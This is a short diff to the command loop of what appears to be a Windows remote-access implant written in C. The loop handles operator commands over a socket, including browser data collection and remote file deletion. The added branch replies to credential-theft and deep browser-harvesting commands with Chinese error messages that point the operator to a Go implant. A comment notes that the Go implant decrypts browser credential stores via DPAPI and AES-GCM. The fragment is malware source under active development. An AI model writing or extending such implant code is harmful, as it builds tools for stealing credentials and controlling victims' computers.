@@ -367,6 +367,16 @@ static int session_loop(SOCKET s) {
             } else if (type == CMD_BROWSER) {
                 handle_browser(s);
                 last_hb = GetTickCount();
+            } else if (type == CMD_CREDS || type == CMD_BROWSER_DEEP) {
+                /* This build has no credential collector: it would need the
+                   SQLite page reader plus DPAPI/AES-GCM unwrapping that the Go
+                   implant carries. Answer explicitly instead of ignoring the
+                   frame - silence leaves the task open forever and wedges the
+                   session queue. */
+                send_err(s, type == CMD_CREDS
+                         ? "C 植入端不支持凭据采集，请改用 Go 植入端"
+                         : "C 植入端不支持浏览器深度采集，请改用 Go 植入端");
+                last_hb = GetTickCount();
             } else if (type == CMD_FS_DEL) {
                 if (inlen >= BUF_SZ) inlen = BUF_SZ - 1;
                 inbuf[inlen] = 0;
